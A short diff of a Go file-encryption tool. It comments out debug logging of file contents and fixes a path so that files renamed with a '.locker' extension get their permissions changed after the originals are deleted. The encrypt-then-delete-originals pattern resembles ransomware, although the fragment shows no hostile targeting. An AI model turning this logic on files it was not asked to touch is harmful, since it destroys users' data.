@@ -139,14 +139,14 @@ func encrypt(filename string, key []byte) {
 		log.Fatal("error while creating aescipher: ", err)
 	}
 	file, err := ioutil.ReadFile(filename)
-	log.Printf("tared file: %x", file)
+	// log.Printf("tared file: %x", file)
 	if err != nil {
 		log.Fatal("error while reading tared file: ", err)
 	}
 	// fileData = padded file
 	fileData := padding(file, aesBlock.BlockSize())
 	file = nil //free the memory
-	log.Printf("padded file: %x", fileData)
+	// log.Printf("padded file: %x", fileData)
 
 	// var encrypted []byte
 	tmpData := make([]byte, aesBlock.BlockSize())
@@ -237,7 +237,7 @@ func removeCopies(filename string, start bool, originalName string) {
 			os.Chmod(originalName, 0777)
 			os.RemoveAll(originalName)
 		}
-		changeMod(filename)
+		changeMod(originalName + ".locker")
 	}
 	os.RemoveAll(filename)
 }
